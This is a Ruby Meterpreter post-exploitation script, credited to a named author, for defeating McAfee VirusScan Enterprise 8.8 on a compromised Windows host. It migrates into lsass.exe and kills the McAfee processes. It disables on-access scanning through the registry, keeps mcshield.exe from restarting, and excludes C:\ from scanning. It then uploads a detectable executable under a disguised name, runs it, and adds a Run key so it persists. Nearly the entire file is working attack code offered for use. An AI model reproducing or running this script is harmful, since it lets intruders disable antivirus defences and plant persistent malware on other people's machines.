# Meterpreter script that kills some Mcafee VirusScan Enterprise v8.8 processes and keeps VirusScan icon visible
# at system tray.
# Additionally it lets you disable On Access Scanner from registry, upload your detectable 
# binary to TEMP folder, add c: to the VirusScan exclusion list and add CurrentVersion\Run 
# registry key. (Requires Administrator privilege. Tested on XP SP3)
# The process mcshield.exe will be killed before the change of the registry keys.
#
# To kill completely mcshield.exe, the script kills the system tray icon and write a dummy value in a registry key that 
# block mcshield.exe to start again.
#
# Credits: Modified the script of Mert SARICA (virusscan_bypass.rb) to make it work on version 8.8
# 
# Provided by: Marc Doudiet - marc.doudiet {@}gmail-dot-com "

session = client
@@exec_opts = Rex::Parser::Arguments.new(
	"-h" => [ false,"Help menu." ],
	"-k" => [ false,"Only kills VirusScan processes. Kills also the icon tray (less stealthy)" ],
	"-e" => [ true,"Executable to upload to target host. (modifies registry and exclusion list)" ],
	"-x" => [ false,"Run the uploaded executable" ],
	"-a" => [ false,"Set the registry key to run the executable at startup"]
)

################## function declaration Declarations ##################
def usage()
	print_line "\nAuthor: Marc Doudiet"
	print_line "----------------------------------------------------------------------------------------------" 
	print_line "Bypasses Mcafee VirusScan Enterprise v8.8, uploads an executable to TEMP folder adds c:\\"
	print_line "to exclusion list and run it . Can set it to run at startup. Option to kill mcshield.exe service."
	print_line "(All tasks requires Administrator privilege)"
	print_line "----------------------------------------------------------------------------------------------" 
	print_line(@@exec_opts.usage)
end

@path = ""
@location = ""

def upload(session,file,trgloc)
	if not ::File.exists?(file)
		raise "File to Upload does not exists!"
	else
		@location = session.fs.file.expand_path("%TEMP%")
		begin
			ext = file.scan(/\S*(.exe)/i)
			if ext.join == ".exe"
				fileontrgt = "#{@location}\\MS#{rand(100)}.exe"
			else
				fileontrgt = "#{@location}\\MS#{rand(100)}#{ext}"
			end
			@path = fileontrgt
			print_status("Uploading #{file}....")
			session.fs.file.upload_file("#{fileontrgt}","#{file}")
			print_status("Uploaded as #{fileontrgt}")
		rescue ::Exception => e
			print_status("Error uploading file #{file}: #{e.class} #{e}")
		end
	end
	return fileontrgt
end

def kill_mcshield()
	target_pid_mc = nil
        ### Check if the process is running and kill it
        target_pid_mc = client.sys.process['mcshield.exe']
        if target_pid_mc
                print_status("Killing off mcshield.exe...")
                client.sys.process.kill(target_pid_mc)
		select(nil, nil, nil, 1) # Waiting
        else
		print_status("Process mcshield not running. Not killing")
	end
end

###################### Parsing of Options
file = ""
helpcall = 0
killonly = 0
set_exec = 0
set_autorun = 0
@@exec_opts.parse(args) { |opt, idx, val|
	case opt
	when "-e"
		file = val || ""
	when "-h"
		helpcall = 1
	when "-k"
		killonly = 1
	when "-x"
		set_exec = 1
	when "-a"
		set_autorun = 1
	end
}

###################### File has to be set
if killonly == 0
	if file == ""
		usage
		raise Rex::Script::Completed
	end
end

###################### Kill processes - don't kill shstat.exe as tray icon by default
avs = %W{
	FrameworkService.exe
	VsTskMgr.exe
	mfeann.exe
	naPrdMgr.exe
}

###################### Check Version 8.8

v = registry_getvaldata("HKLM\\SOFTWARE\\McAfee\\DesktopProtection","szProductVer")
if v 
	if v.include? '8.8'
		print_status ("Running version 8.8 (version: #{v})")
	else
		print_error("Not running version 8.8 - Running version : #{v}")
		raise Rex::Script::Completed
	end
end
###################### End Check Version

###################### Migrating to lsass.exe to get system privs

target_pid = nil
target ||= "lsass.exe"

print_status("Migrating to #{target}...")
	
# Get the target process pid
target_pid = client.sys.process[target]

if not target_pid
	print_error("Could not access the target process")
	raise Rex::Script::Completed
end

print_status("Migrating into process ID #{target_pid}")
server = client.sys.process.open
if target_pid == server.pid
	print_status("Not migrating, already in lsass.exe")
else
	client.core.migrate(target_pid)
end
###################### End lsass.exe migration

target_pid = nil

if killonly == 1
###################### Killing mcshield.exe by killing all processes and inserting dummy data in reg value
	avs = %W{
		FrameworkService.exe
		VsTskMgr.exe
		mfeann.exe
		naPrdMgr.exe
		SHSTAT.EXE
	}
	avs.each do |x|
	# Get the target process pid
		target_pid = client.sys.process[x]
		if target_pid
			print_status("Killing off #{x}...")
			client.sys.process.kill(target_pid)
		end	
	end
	#else	

	# Mcafee registry key
		key = 'HKLM\Software\Mcafee\SystemCore\VSCore\On Access Scanner\MCShield\Configuration\Default'

	# Split the key into its parts
		root_key, base_key = client.sys.registry.splitkey(key)

	# Disable when writing to disk option
		value = "bScanIncoming"
		data = "DUMMY"
		type = "REG_SZ"
		kill_mcshield()
		open_key = client.sys.registry.open_key(root_key, base_key, KEY_WRITE)
		open_key.set_value(value, client.sys.registry.type2str(type), data)
		print_status("Successful set #{key} -> #{value} to #{data}.")
		print_status("Waiting ... ")
		select(nil, nil, nil, 5) # Waiting
		kill_mcshield()
                print_status("Waiting ... ")
                select(nil, nil, nil, 5) # Waiting
                kill_mcshield()
                print_status("Waiting ... ")
		select(nil, nil, nil, 5) # Waiting
                kill_mcshield()
                print_status("Waiting ... ")
                select(nil, nil, nil, 5) # Waiting
                kill_mcshield()
                print_status("Waiting ... ")
                select(nil, nil, nil, 5) # Waiting
                kill_mcshield()
		print_status("Successful kill of mcshield.exe")
		raise Rex::Script::Completed
###################### End Kill of mcshield.exe
else
###################### Uploading the executable
	avs.each do |x|
		# Get the target process pid
		target_pid = client.sys.process[x]
		if target_pid
			print_status("Killing off #{x}...")
			client.sys.process.kill(target_pid)
		end
	end

	# Initiailze vars
	key   = nil
	value = nil
	data  = nil
	type  = nil

	# Mcafee registry key
	key = 'HKLM\Software\Mcafee\SystemCore\VSCore\On Access Scanner\MCShield\Configuration\Default'

	# Split the key into its parts
	root_key, base_key = client.sys.registry.splitkey(key)

	# Disable when writing to disk option
	value = "bScanIncoming"
	data = 0
	type = "REG_DWORD"
	kill_mcshield()
	open_key = client.sys.registry.open_key(root_key, base_key, KEY_WRITE)
	open_key.set_value(value, client.sys.registry.type2str(type), data)
	print_status("Successful set #{key} -> #{value} to #{data}.")

	# Disable when reading from disk option
	value = "bScanOutgoing"
	data = 0
	type = "REG_DWORD"
	kill_mcshield()
	open_key = client.sys.registry.open_key(root_key, base_key, KEY_WRITE)
	open_key.set_value(value, client.sys.registry.type2str(type), data)
	print_status("Successful set #{key} -> #{value} to #{data}.")

	# Disable detection of unwanted programs
	value = "ApplyNVP"
	data = 0
	type = "REG_DWORD"
	kill_mcshield()
	open_key = client.sys.registry.open_key(root_key, base_key, KEY_WRITE)
	open_key.set_value(value, client.sys.registry.type2str(type), data)
	print_status("Successful set #{key} -> #{value} to #{data}.")

	# Increase the number of excluded items
	value = "NumExcludeItems"
	data = 1
	type = "REG_DWORD"
	kill_mcshield()
	open_key = client.sys.registry.open_key(root_key, base_key, KEY_WRITE)
	open_key.set_value(value, client.sys.registry.type2str(type), data)
	print_status("Successful set #{key} -> #{value} to #{data}.")

	# Add c:\ to excluded item folder
	value = "ExcludedItem_0"
	data = "3|7|C:\\"
	type = "REG_SZ"
	kill_mcshield()
	open_key = client.sys.registry.open_key(root_key, base_key, KEY_WRITE)
	open_key.set_value(value, client.sys.registry.type2str(type), data)
	print_status("Successful set #{key} -> #{value} to #{data}.")
	
	# Upload it
	print_status("Uploading ...")
    	exec = upload(session,file,"")

	# Check if it has to run the executable
    if set_exec == 1
    		print_status("Running #{exec}")
	 	cmd_exec(exec)	
	else
		print_status("Not running executable (path is #{exec}")
	end

	# Check if it has to set the autorun key
	if set_autorun == 1
		# Set registry to run executable at startup
		key = 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
		# Split the key into its parts
		root_key, base_key = client.sys.registry.splitkey(key)
		value = "MS"
		data = @path
		kill_mcshield()
		open_key = client.sys.registry.open_key(root_key, base_key, KEY_WRITE)
		open_key.set_value(value, client.sys.registry.type2str(type), data)
		print_status("Successful set #{key} -> #{value} to #{data}.")
	else
		print_status("Autorun not set")	 	
	end
###################### End of executable upload
end

print_status("Finished!")
